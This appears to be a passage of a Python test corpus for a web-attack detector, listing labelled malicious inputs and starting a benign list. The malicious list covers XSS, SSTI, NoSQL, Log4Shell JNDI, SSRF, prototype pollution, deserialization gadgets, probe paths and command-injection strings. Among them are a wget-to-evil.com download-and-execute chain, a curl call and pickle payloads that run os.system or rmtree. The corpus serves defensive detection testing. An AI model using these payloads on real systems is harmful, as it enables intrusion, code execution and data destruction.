    MaliciousCase(
        "nosql_regex_operator", "nosql", '{"username": {"$regex": "^admin"}}'
    ),
    MaliciousCase(
        "nosql_in_operator_array", "nosql", '{"role": {"$in": ["admin","root"]}}'
    ),
    MaliciousCase("nosql_exists_operator", "nosql", '{"$exists": true}'),
    MaliciousCase("nosql_ne_operator_bracket_key", "nosql", "username[$ne]=admin"),
    MaliciousCase("nosql_gt_operator_bracket_key", "nosql", "filter[$gt]=100"),
    MaliciousCase("nosql_regex_operator_bracket_key", "nosql", "search[$regex]=.*"),
    MaliciousCase("nosql_where_operator_bracket_key", "nosql", "x[$where]=sleep(1)"),
    MaliciousCase("file_upload_php_extension", "file_upload", 'filename="shell.php"'),
    MaliciousCase(
        "file_upload_space_around_equals", "file_upload", 'filename = "shell.php"'
    ),
    MaliciousCase(
        "file_upload_space_before_equals", "file_upload", 'filename ="shell.php"'
    ),
    MaliciousCase(
        "file_upload_space_after_equals", "file_upload", 'filename= "shell.php"'
    ),
    MaliciousCase(
        "file_upload_tab_around_equals",
        "file_upload",
        'filename\t=\t"shell.php"',
    ),
    MaliciousCase(
        "file_upload_newline_after_equals",
        "file_upload",
        'filename=\n"shell.php"',
    ),
    MaliciousCase(
        "file_upload_percent_encoded_space_around_equals",
        "file_upload",
        'filename%20=%20"shell.php"',
        "encoding_aware",
    ),
    MaliciousCase(
        "file_upload_single_quote_space_around_equals",
        "file_upload",
        "filename = 'shell.php'",
    ),
    MaliciousCase(
        "file_upload_double_extension_space_around_equals",
        "file_upload",
        'filename = "shell.php.jpg"',
    ),
    MaliciousCase(
        "file_upload_truncation_space_around_equals",
        "file_upload",
        'filename = "shell.php%00.jpg"',
    ),
    MaliciousCase(
        "file_upload_decoded_truncation_space_around_equals",
        "file_upload",
        'filename = "shell.php\x00.jpg"',
    ),
    MaliciousCase(
        "file_upload_phtml_extension", "file_upload", 'filename="shell.phtml"'
    ),
    MaliciousCase(
        "file_upload_jsp_extension", "file_upload", 'filename="webshell.jsp"'
    ),
    MaliciousCase(
        "file_upload_double_extension_phar", "file_upload", "filename='avatar.phar'"
    ),
    MaliciousCase("file_upload_asp_extension", "file_upload", 'filename="cmd.asp"'),
    MaliciousCase(
        "file_upload_exe_extension", "file_upload", 'filename="installer.exe"'
    ),
    MaliciousCase(
        "file_upload_double_extension_php_jpg",
        "file_upload",
        'filename="shell.php.jpg"',
    ),
    MaliciousCase(
        "file_upload_double_extension_asp_png",
        "file_upload",
        'filename="malware.asp.png"',
    ),
    MaliciousCase(
        "file_upload_null_byte_percent_encoded",
        "file_upload",
        'filename="shell.php%00.jpg"',
    ),
    MaliciousCase(
        "file_upload_null_byte_raw_0x00",
        "file_upload",
        'filename="shell.php\x00.jpg"',
    ),
    MaliciousCase(
        "file_upload_null_byte_short_escape",
        "file_upload",
        'filename="shell.php\\0.jpg"',
    ),
    MaliciousCase("file_upload_pht_extension", "file_upload", 'filename="shell.pht"'),
    MaliciousCase(
        "file_upload_double_extension_pht_jpg",
        "file_upload",
        'filename="shell.pht.jpg"',
    ),
    MaliciousCase(
        "file_upload_jspx_extension", "file_upload", 'filename="webshell.jspx"'
    ),
    MaliciousCase(
        "file_upload_shtml_extension", "file_upload", 'filename="shell.shtml"'
    ),
    MaliciousCase("file_upload_ashx_extension", "file_upload", 'filename="shell.ashx"'),
    MaliciousCase("file_upload_asa_extension", "file_upload", 'filename="shell.asa"'),
    MaliciousCase("file_upload_asax_extension", "file_upload", 'filename="shell.asax"'),
    MaliciousCase("file_upload_ascx_extension", "file_upload", 'filename="shell.ascx"'),
    MaliciousCase("file_upload_cfm_extension", "file_upload", 'filename="shell.cfm"'),
    MaliciousCase("file_upload_cfc_extension", "file_upload", 'filename="shell.cfc"'),
    MaliciousCase("file_upload_war_extension", "file_upload", 'filename="shell.war"'),
    MaliciousCase(
        "template_double_curly_system",
        "template",
        "{{ config.__class__.__init__.__globals__.os.system }}",
    ),
    MaliciousCase(
        "template_percent_curly_exec",
        "template",
        "{% self.__init__.__globals__.__builtins__.exec %}",
    ),
    MaliciousCase(
        "template_erb_runtime_exec",
        "template",
        "<%= Runtime.getRuntime().exec('id') %>",
    ),
    MaliciousCase(
        "template_ognl_el_injection",
        "template",
        "${@java.lang.Runtime@getRuntime().exec('id')}",
    ),
    MaliciousCase("template_dollar_brace_arithmetic", "template", "${7*7}"),
    MaliciousCase(
        "template_erb_file_read", "template", "<%= File.read('/etc/passwd') %>"
    ),
    MaliciousCase(
        "http_split_crlf_location",
        "http_split",
        "search=x\r\nLocation: http://evil.example",
    ),
    MaliciousCase(
        "http_split_crlf_set_cookie",
        "http_split",
        "id=1\r\nSet-Cookie: session=hijacked",
    ),
    MaliciousCase(
        "http_split_crlf_http_response", "http_split", "name=x\r\nHTTP/1.1 200 OK"
    ),
    MaliciousCase(
        "http_split_newline_only_location",
        "http_split",
        "value\nLocation: http://evil.example",
    ),
    MaliciousCase("sensitive_file_dotenv_root", "sensitive_file", "/.env"),
    MaliciousCase("sensitive_file_dotenv_local", "sensitive_file", "/.env.local"),
    MaliciousCase("sensitive_file_config_yml", "sensitive_file", "/app-config.yml"),
    MaliciousCase("sensitive_file_python_source", "sensitive_file", "/app/settings.py"),
    MaliciousCase("sensitive_file_git_dir", "sensitive_file", "/.git/config"),
    MaliciousCase(
        "sensitive_file_regression7_var_www_dotenv",
        "sensitive_file",
        "/var/www/.env",
    ),
    MaliciousCase(
        "sensitive_file_regression7_app_git_config_standalone",
        "sensitive_file",
        "/app/.git/config",
    ),
    MaliciousCase("cms_probing_wp_admin", "cms_probing", "/wp-admin/"),
    MaliciousCase("cms_probing_wp_login", "cms_probing", "/wp-login.php"),
    MaliciousCase("cms_probing_xmlrpc", "cms_probing", "/xmlrpc.php"),
    MaliciousCase("cms_probing_phpinfo", "cms_probing", "/phpinfo.php"),
    MaliciousCase("cms_probing_backup_extension", "cms_probing", "/site.bak"),
    MaliciousCase("cms_probing_htpasswd", "cms_probing", "/.htpasswd"),
    MaliciousCase(
        "cms_probing_wp_admin_nested_path",
        "cms_probing",
        "/blog/wp-admin/setup.php",
    ),
    MaliciousCase("cms_probing_phpinfo_with_query", "cms_probing", "/info.php?x=1"),
    MaliciousCase(
        "cms_probing_standalone_wp_admin_setup_config_control",
        "cms_probing",
        "/wp-admin/setup-config.php",
    ),
    MaliciousCase("recon_actuator_probe", "recon", "/actuator/health"),
    MaliciousCase("recon_server_status", "recon", "/server-status"),
    MaliciousCase("recon_cgi_bin_probe", "recon", "/cgi-bin/test.cgi"),
    MaliciousCase("recon_appsettings_json", "recon", "/appsettings.json"),
    MaliciousCase("recon_pom_xml", "recon", "/pom.xml"),
    MaliciousCase("recon_readme_md", "recon", "/README.md"),
    MaliciousCase("recon_git_head", "recon", "/.git/HEAD"),
    MaliciousCase("recon_owa_probe", "recon", "/owa/auth/logon.aspx"),
    MaliciousCase(
        "recon_actuator_nested_with_query",
        "recon",
        "/api/actuator/health?trace=1",
    ),
    MaliciousCase("recon_git_refs_nested_path", "recon", "/repo/.git/refs/heads/main"),
    MaliciousCase(
        "recon_docker_compose_nested_with_query",
        "recon",
        "/infra/docker-compose.yml?raw=1",
    ),
    MaliciousCase("recon_secrets_nested_path", "recon", "/config/app-secrets.yml"),
    MaliciousCase(
        "recon_config_dump_nested_under_backend", "recon", "/backend/config_dump"
    ),
    MaliciousCase("recon_actuator_env_probe", "recon", "/actuator/env"),
    MaliciousCase("recon_config_dump_top_level", "recon", "/config_dump"),
    MaliciousCase("recon_bare_system_top_level", "recon", "/system"),
    MaliciousCase(
        "proto_pollution_isadmin_key",
        "proto_pollution",
        '{"__proto__":{"isAdmin":true}}',
    ),
    MaliciousCase(
        "proto_pollution_constructor_prototype",
        "proto_pollution",
        'constructor["prototype"]["polluted"]=true',
    ),
    MaliciousCase(
        "proto_pollution_prototype_dot_access",
        "proto_pollution",
        "constructor.prototype.polluted = true",
    ),
    MaliciousCase(
        "proto_pollution_proto_bracket_key",
        "proto_pollution",
        '{"__proto__" : {"role":"admin"}}',
    ),
    MaliciousCase(
        "proto_pollution_base64_wrapped_isadmin",
        "proto_pollution",
        "eyJfX3Byb3RvX18iOnsiaXNBZG1pbiI6dHJ1ZX19",
        "encoding_aware",
    ),
    MaliciousCase(
        "proto_pollution_bracket_arbitrary_key",
        "proto_pollution",
        "__proto__[isAdmin]=true",
    ),
    MaliciousCase(
        "proto_pollution_constructor_bracket_prototype_unquoted",
        "proto_pollution",
        "constructor[prototype][isAdmin]=true",
    ),
    MaliciousCase(
        "proto_pollution_dot_arbitrary_key",
        "proto_pollution",
        "__proto__.polluted=1",
    ),
    MaliciousCase(
        "code_injection_process_start",
        "code_injection",
        'System.Diagnostics.Process.Start("cmd.exe","/c whoami")',
    ),
    MaliciousCase(
        "code_injection_reflection_namespace",
        "code_injection",
        "System.Reflection.Assembly.GetExecutingAssembly()",
    ),
    MaliciousCase(
        "code_injection_assembly_load",
        "code_injection",
        "Assembly.Load(maliciousBytes)",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_scanner_hit_install_php",
        "cms_probing",
        "Note: the scanner hit /wp-admin/install.php on our staging host.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_bot_probed_install_php",
        "cms_probing",
        "Intrusion alert: a bot probed /wp-admin/install.php from 203.0.113.9.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_waf_blocked_setup_config",
        "cms_probing",
        "Our WAF blocked a request targeting /wp-admin/setup-config.php just now.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_exploit_xmlrpc",
        "cms_probing",
        "Someone attempted to exploit /xmlrpc.php on the checkout server overnight.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_attacker_payload_wp_login",
        "cms_probing",
        "The attacker's payload tried to reach /wp-login.php with brute-force "
        "credentials.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_malicious_probe_phpinfo",
        "cms_probing",
        "Security team confirmed a malicious probe against /phpinfo.php last night.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_exploitation_attempts_install_php",
        "cms_probing",
        "Logs show repeated exploitation attempts on /wp-admin/install.php this "
        "morning.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_botnet_scanning_setup_config",
        "cms_probing",
        "A known botnet is scanning for /wp-admin/setup-config.php across our fleet.",
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_attacker_git_config",
        "sensitive_file",
        "We detected an attacker trying to access /.git/config on the public endpoint.",
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_threat_feed_var_www_env",
        "sensitive_file",
        "Threat feed flagged traffic hitting /var/www/.env from a Tor exit node.",
    ),
    MaliciousCase(
        "dir_traversal_embedded_prose_honeypot_etc_passwd",
        "dir_traversal",
        "The honeypot recorded a request to /etc/passwd from an unknown scanner.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_scanner_hit_htpasswd",
        "cms_probing",
        "Vulnerability scanner attempted a hit on /.htpasswd during the pentest.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_blocked_probe_install_php",
        "cms_probing",
        "Blocked malicious traffic: a probe against /wp-admin/install.php was denied.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_repeated_attacks_xmlrpc",
        "cms_probing",
        "Suspicious activity: repeated attacks on /xmlrpc.php from a botnet.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_pentest_exploitation_setup_config",
        "cms_probing",
        "The pentest log shows exploitation of /wp-admin/setup-config.php succeeded.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_intrusion_detection_phpinfo",
        "cms_probing",
        "Intrusion detection triggered on a request for /phpinfo.php from a scanner.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_credential_stuffing_wp_login",
        "cms_probing",
        "A malicious actor tried /wp-login.php with a credential-stuffing list.",
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_bad_actor_dotenv",
        "sensitive_file",
        "We caught a bad actor probing /.env on the load balancer.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_attacker_pivot_install_php",
        "cms_probing",
        "The attacker pivoted and hit /wp-admin/install.php right after recon.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_soc_exploit_setup_config",
        "cms_probing",
        "SOC confirmed the exploit attempt against /wp-admin/setup-config.php.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_attack_tooling_xmlrpc",
        "cms_probing",
        "Automated attack tooling scanned for /xmlrpc.php on every subdomain.",
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_scanner_git_config",
        "sensitive_file",
        "The scanner also hit /.git/config while enumerating the site.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_hostile_probe_install_php",
        "cms_probing",
        "We saw a hostile probe against /wp-admin/install.php at 3am.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_malicious_crawler_phpinfo_wp_login",
        "cms_probing",
        "Malicious crawler attempted /phpinfo.php then moved to /wp-login.php.",
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_intrusion_var_www_env",
        "sensitive_file",
        "The intrusion attempt against /var/www/.env was blocked by the WAF.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_exploit_kit_setup_config",
        "cms_probing",
        "An exploit kit tried to reach /wp-admin/setup-config.php twice.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_attack_traffic_install_php",
        "cms_probing",
        "Attack traffic hit /wp-admin/install.php from a known bad IP range.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_scanner_htpasswd_credentials",
        "cms_probing",
        "The scanner probed /.htpasswd looking for exposed credentials.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_bruteforce_bot_wp_login",
        "cms_probing",
        "A brute-force bot hit /wp-login.php more than 500 times overnight.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_recon_activity_xmlrpc",
        "cms_probing",
        "Recon activity included a hit on /xmlrpc.php before the real attack.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_spoofed_referer_install_php",
        "cms_probing",
        "The malicious request targeted /wp-admin/install.php via a spoofed referer.",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_ids_flagged_setup_config",
        "cms_probing",
        "Our IDS flagged an exploitation attempt against /wp-admin/setup-config.php.",
    ),
    MaliciousCase(
        "cmd_env_abs_path_shell_dash_c", "cmd_injection", "/usr/bin/env bash -c id"
    ),
    MaliciousCase(
        "cmd_separator_env_abs_path_shell",
        "cmd_injection",
        "; /usr/bin/env sh -c id",
    ),
    MaliciousCase(
        "cms_probing_wp_content_themes_default",
        "cms_probing",
        "/wp-content/themes/default",
    ),
    MaliciousCase("ldap_null_byte_single_paren_attr_uid", "ldap", "uid=*)%00"),
    MaliciousCase("ldap_null_byte_single_paren_filter_uid", "ldap", "(uid=*)%00"),
    MaliciousCase("ldap_null_byte_single_paren_attr_mail", "ldap", "mail=*)%00"),
    MaliciousCase(
        "ldap_null_byte_single_paren_attr_objectclass",
        "ldap",
        "objectClass=*)%00",
    ),
    MaliciousCase(
        "cmd_glued_backtick_past_rejected_leftmost_match",
        "cmd_injection",
        "`id` search`whoami`",
        "production",
        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cmd_defect5_sql_keyword_after_glued_shell_command",
        "cmd_injection",
        "search`whoami` LIMIT 10",
        "production",
        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cmd_defect5_sql_keyword_before_glued_shell_command",
        "cmd_injection",
        "SELECT note; search`whoami`",
    ),
    MaliciousCase(
        "cmd_defect5_prefix_command_word_glued_shell_command",
        "cmd_injection",
        "curl`whoami` data on file",
        "production",
        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cmd_defect5_sql_keyword_within_exemption_window",
        "cmd_injection",
        "SELECT " + ("z" * 26) + " search`whoami`",
        "production",
        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cmd_defect5_bare_chained_download_and_execute_in_prose",
        "cmd_injection",
        "set your profile bio to: `wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`",
    ),
    MaliciousCase(
        "cmd_dollar_paren_bare_whoami",
        "cmd_injection",
        "$(whoami)",
        "production",
        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cmd_dollar_paren_bare_cat_passwd", "cmd_injection", "$(cat /etc/passwd)"
    ),
    MaliciousCase(
        "cmd_dollar_paren_glued_prefix_curl_evil_com",
        "cmd_injection",
        "x$(curl evil.com)",
    ),
    MaliciousCase(
        "cmd_dollar_paren_glued_wrapped_whoami",
        "cmd_injection",
        "foo$(whoami)bar",
        "production",
        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
    ),
    MaliciousCase("cmd_dollar_brace_bare_ifs", "cmd_injection", "${IFS}"),
    MaliciousCase(
        "cmd_log4shell_direct_jndi_ldap",
        "cmd_injection",
        "${jndi:ldap://evil.example/a}",
    ),
    MaliciousCase(
        "cmd_log4shell_direct_jndi_rmi",
        "cmd_injection",
        "${jndi:rmi://evil.example/a}",
    ),
    MaliciousCase(
        "cmd_log4shell_direct_jndi_dns",
        "cmd_injection",
        "${jndi:dns://evil.example/a}",
    ),
    MaliciousCase(
        "cmd_log4shell_obfuscated_lower_bare", "cmd_injection", "${lower:j}ndi"
    ),
    MaliciousCase(
        "cmd_log4shell_obfuscated_default_value_bare",
        "cmd_injection",
        "${::-j}ndi",
    ),
    MaliciousCase(
        "cmd_log4shell_obfuscated_nested_full_exploit",
        "cmd_injection",
        "${${lower:j}ndi:ldap://evil.example/a}",
    ),
    MaliciousCase(
        "cmd_denylist_glued_nmap",
        "cmd_injection",
        "x`nmap`",
        "production",
        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cmd_denylist_glued_powershell",
        "cmd_injection",
        "x`powershell`",
        "production",
        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
    ),
    MaliciousCase("xss_ontoggle_details", "xss", "<details ontoggle=alert(1)>"),
    MaliciousCase("xss_onpointerdown_div", "xss", "<div onpointerdown=alert(1)>"),
    MaliciousCase("xss_onanimationstart_svg", "xss", "<svg onanimationstart=alert(1)>"),
    MaliciousCase("xss_onmousedown_body", "xss", "<body onmousedown=alert(1)>"),
    MaliciousCase("xss_onwheel_div", "xss", "<div onwheel=alert(1)>"),
    MaliciousCase(
        "ssrf_userinfo_prefixed_named_host_localhost",
        "ssrf",
        "http://x@localhost/",
    ),
    MaliciousCase(
        "ssrf_userinfo_prefixed_named_host_gcp_metadata",
        "ssrf",
        "http://attacker@metadata.google.internal/",
    ),
    MaliciousCase("xss_svg_onload_slash_sep", "xss", "<svg/onload=alert(1)>"),
    MaliciousCase("xss_img_onerror_slash_sep", "xss", "<img/onerror=alert(1)>"),
    MaliciousCase("xss_svg_onbegin_slash_sep", "xss", "<svg/onbegin=alert(1)>"),
    MaliciousCase(
        "xss_details_ontoggle_slash_sep", "xss", "<details/ontoggle=alert(1)>"
    ),
    MaliciousCase("xss_body_onactivate_quoted", "xss", '<body onactivate="alert(1)">'),
    MaliciousCase("xss_input_onfocusin_quoted", "xss", '<input onfocusin="alert(1)">'),
    MaliciousCase(
        "xss_div_onmousewheel_quoted", "xss", '<div onmousewheel="alert(1)">'
    ),
    MaliciousCase(
        "xss_marquee_onbounce_quoted", "xss", '<marquee onbounce="alert(1)">'
    ),
    MaliciousCase(
        "xss_div_onwebkitfullscreenchange_quoted",
        "xss",
        '<div onwebkitfullscreenchange="alert(1)">',
    ),
    MaliciousCase(
        "xss_x_onafterscriptexecute_quoted",
        "xss",
        '<x onafterscriptexecute="alert(1)">',
    ),
    MaliciousCase(
        "xss_x_onbeforescriptexecute_quoted",
        "xss",
        '<x onbeforescriptexecute="alert(1)">',
    ),
    MaliciousCase("template_ssti_curly_brace_arith_int", "template", "{{7*7}}"),
    MaliciousCase(
        "template_ssti_curly_brace_arith_quoted_right", "template", "{{7*'7'}}"
    ),
    MaliciousCase(
        "template_ssti_curly_brace_arith_quoted_left", "template", "{{'7'*7}}"
    ),
    MaliciousCase(
        "template_ssti_curly_brace_arith_double_quoted",
        "template",
        '{{"5"+"5"}}',
    ),
    MaliciousCase("template_ssti_curly_brace_call", "template", "{{config.items()}}"),
    MaliciousCase("template_ssti_hash_brace_arith", "template", "#{7*7}"),
    MaliciousCase(
        "template_ssti_hash_brace_java_runtime_exec",
        "template",
        "#{T(java.lang.Runtime).exec('id')}",
    ),
    MaliciousCase("ssrf_double_at_parser_confusion", "ssrf", "http://a@b@evil.com"),
    MaliciousCase(
        "ssrf_double_at_metadata_ip_masked",
        "ssrf",
        "http://169.254.169.254@trusted@evil.com",
    ),
    MaliciousCase(
        "sensitive_file_trailing_tilde_wp_config",
        "sensitive_file",
        "/wp-config.php~",
    ),
    MaliciousCase(
        "sensitive_file_trailing_tilde_bare_config",
        "sensitive_file",
        "config.php~",
    ),
    MaliciousCase("sensitive_file_trailing_tilde_env", "sensitive_file", "/.env~"),
    MaliciousCase(
        "deserialization_java_serialized_object_b64",
        "deserialization",
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkA"
        "CXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAADZm9veA==",
    ),
    MaliciousCase(
        "deserialization_dotnet_binaryformatter_b64",
        "deserialization",
        "AAEAAAD/////AQAAAAAAAABTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92"
        "aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1"
        "cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQ==",
    ),
    MaliciousCase(
        "deserialization_python_pickle_proto4_b64",
        "deserialization",
        "gASVIwAAAAAAAAB9lCiMBHVzZXKUjAVhbGljZZSMBHJvbGWUjAVhZG1pbpR1Lg==",
    ),
    MaliciousCase(
        "deserialization_ruby_marshal_gem_requirement_b64",
        "deserialization",
        "BAhvOhVHZW06OlJlcXVpcmVtZW50BjoSQHJlcXVpcmVtZW50c1sG",
    ),
    MaliciousCase(
        "deserialization_php_object_injection_stdclass",
        "deserialization",
        'O:8:"stdClass":1:{s:4:"prop";s:9:"pwnedval1";}',
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_os_system",
        "deserialization",
        "cos\nsystem\n(S'id'\ntR.",
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_arbitrary_module",
        "deserialization",
        "cshutil\nrmtree\n(S'/tmp/x'\ntR.",
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_none_prefixed",
        "deserialization",
        _payload_as_ingested_from_the_wire(b"Ncshutil\nrmtree\n(S'/tmp/x'\ntR."),
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_empty_dict_prefixed",
        "deserialization",
        _payload_as_ingested_from_the_wire(b"}cshutil\nrmtree\n(S'/tmp/x'\ntR."),
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_mark_prefixed",
        "deserialization",
        _payload_as_ingested_from_the_wire(b"(cshutil\nrmtree\n(S'/tmp/x'\ntR."),
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_proto_header_prefixed",
        "deserialization",
        _payload_as_ingested_from_the_wire(b"\x80\x04cshutil\nrmtree\n(S'/tmp/x'\ntR."),
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_binint1_prefixed",
        "deserialization",
        _payload_as_ingested_from_the_wire(b"K\x00cshutil\nrmtree\n(S'/tmp/x'\ntR."),
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_newtrue_prefixed",
        "deserialization",
        _payload_as_ingested_from_the_wire(b"\x88cshutil\nrmtree\n(S'/tmp/x'\ntR."),
    ),
    MaliciousCase(
        "deserialization_ruby_marshal_array_top_level_b64",
        "deserialization",
        "BAhbBmkGaQc=",
    ),
    MaliciousCase(
        "deserialization_ruby_marshal_hash_top_level_b64",
        "deserialization",
        "BAh7BkkiCGNtZAY6BkVUSSIGaWQGOwBU",
    ),
    MaliciousCase(
        "deserialization_php_serializable_object_injection",
        "deserialization",
        'C:11:"ArrayObject":32:{x:i:0;a:0:{};m:a:0:{};}',
    ),
    MaliciousCase(
        "deserialization_php_enum_serialization",
        "deserialization",
        'E:11:"Suit:Hearts";',
    ),
    MaliciousCase(
        "deserialization_dotnet_objectdataprovider_xaml_gadget",
        "deserialization",
        '<ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/'
        'winfx/2006/xaml/presentation"><ObjectDataProvider.MethodParameters>'
        '<System:String xmlns:System="clr-namespace:System;assembly=mscorlib">'
        "cmd /c calc</System:String></ObjectDataProvider.MethodParameters>"
        "</ObjectDataProvider>",
    ),
    # LEDGER 4.04, D-59 (4.04 B): scanner probes that only a path-extension row
    # catches. Neither benign path set holds a PHP-app path, so a PHP-app benign
    # set is owed in the port phase.
    MaliciousCase("recon_backup_sql_probe", "sensitive_file", "/backup.sql"),
    MaliciousCase("recon_dump_sql_probe", "sensitive_file", "/dump.sql"),
    MaliciousCase("recon_db_sql_probe", "sensitive_file", "/db.sql"),
    MaliciousCase("recon_webshell_shell_php", "sensitive_file", "/shell.php"),
    MaliciousCase("recon_webshell_cmd_php", "sensitive_file", "/cmd.php"),
    MaliciousCase("recon_webshell_c99_php", "recon", "/c99.php"),
    MaliciousCase("recon_webshell_r57_php", "recon", "/r57.php"),
    MaliciousCase("recon_webshell_c99_nested", "recon", "/tools/c99.php"),
    MaliciousCase("recon_webshell_shell_in_uploads", "recon", "/uploads/shell.php"),
    MaliciousCase(
        "recon_webshell_cmd_in_wp_uploads", "recon", "/wp-content/uploads/2024/cmd.php"
    ),
    MaliciousCase("recon_admin_php_probe", "sensitive_file", "/admin.php"),
    MaliciousCase(
        "recon_phpunit_eval_stdin",
        "recon",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ),
    MaliciousCase(
        "recon_phpunit_eval_stdin_under_prefix",
        "recon",
        "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ),
    MaliciousCase("recon_manage_py_probe", "sensitive_file", "/manage.py"),
    MaliciousCase("recon_wsgi_py_probe", "sensitive_file", "/wsgi.py"),
    MaliciousCase("recon_app_py_probe", "sensitive_file", "/app.py"),
    MaliciousCase("recon_main_go_probe", "sensitive_file", "/main.go"),
    MaliciousCase("recon_deploy_sh_probe", "sensitive_file", "/deploy.sh"),
    MaliciousCase("recon_backup_sh_probe", "sensitive_file", "/backup.sh"),
    MaliciousCase(
        "sensitive_file_nested_settings_py", "sensitive_file", "/srv/app/settings.py"
    ),
    MaliciousCase(
        "sensitive_file_nested_local_settings",
        "sensitive_file",
        "/app/local_settings.py",
    ),
    MaliciousCase(
        "sensitive_file_nested_wp_config_php", "sensitive_file", "/blog/wp-config.php"
    ),
    MaliciousCase(
        "sensitive_file_nested_database_yml",
        "sensitive_file",
        "/app/config/database.yml",
    ),
    MaliciousCase(
        "sensitive_file_nested_appsettings_json",
        "sensitive_file",
        "/api/appsettings.Production.json",
    ),
    # LEDGER 4.04, D-62: root legacy-tech names are probes (a root .shtml sits next to
    # 1205 root .asp names in raft-small-files.txt); /language/<injection> is the IoT
    # language-endpoint RCE shape; CHANGELOG and ChangeLog (case-sensitive) are the
    # extensionless root probes of quickhits.txt:939-940; wp-content/uploads is a
    # probe when it is the bare directory or a script (.php) below it; the two
    # /system files are quickhits.txt:2238-2239.
    MaliciousCase("recon_root_shtml_legacy_page", "recon", "/page.shtml"),
    MaliciousCase(
        "recon_language_ifs_injection",
        "recon",
        "/language/Swedish${IFS}&&cd${IFS}/tmp",
    ),
    MaliciousCase(
        "recon_language_ifs_injection_url_encoded",
        "recon",
        "/language/Swedish%24%7BIFS%7D%26%26cd%24%7BIFS%7D/tmp",
        "encoding_aware",
    ),
    MaliciousCase("recon_changelog_upper_root", "recon", "/CHANGELOG"),
    MaliciousCase("recon_changelog_camel_root", "recon", "/ChangeLog"),
    MaliciousCase("recon_system_cron_txt", "recon", "/system/cron/cron.txt"),
    MaliciousCase("recon_system_error_txt", "recon", "/system/error.txt"),
    MaliciousCase(
        "cms_probing_wp_content_uploads_directory",
        "cms_probing",
        "/wp-content/uploads/",
    ),
    MaliciousCase(
        "cms_probing_wp_content_uploads_script",
        "cms_probing",
        "/wp-content/uploads/2024/shell.php",
    ),
]

BENIGN_CORPUS: list[BenignCase] = [
    BenignCase(
        "xss_docs_script_tag_mention",
        "The `<script>` tag loads external JavaScript resources.",
    ),
    BenignCase(
        "xss_docs_event_handler_mention",
        "Set `onload` and `onerror` handlers carefully to avoid leaking cookies.",
    ),
    BenignCase(
        "xss_docs_javascript_mention",
        "Our onboarding docs mention JavaScript best practices for legacy browsers.",
    ),
    BenignCase(
        "xss_json_event_handler_keys", '{"onclick": "handleClick", "onload": "init"}'
    ),
    BenignCase(
        "xss_docs_style_attribute_mention",
        'Use `style="color:red"` for basic inline styling.',
    ),
    BenignCase(
        "xss_docs_embed_object_mention",
        "`<embed>` and `<object>` tags are deprecated in favor of standard "
        "media elements.",
    ),
    BenignCase(
        "xss_prose_script_kiddie_joke",
        "I love using <3 emoji and script kiddie jokes in my bio.",
    ),
    BenignCase(
